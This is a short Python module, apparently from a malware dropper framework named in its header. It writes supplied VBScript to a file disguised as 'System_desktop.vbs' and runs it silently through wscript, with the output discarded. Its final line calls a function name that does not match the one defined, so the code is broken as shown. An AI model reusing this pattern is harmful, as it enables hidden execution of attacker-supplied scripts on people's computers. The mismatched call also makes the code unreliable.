#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run vbs scripts
#Start

def create_and_run_vbs(tobe):
    import os
    f = open("System_desktop.vbs","w")
    f.write(tobe)
    f.close()
    blah = os.popen( "wscript System_desktop.vbs > nul" )

create_and_run_bat(Vbs_Script_Data)
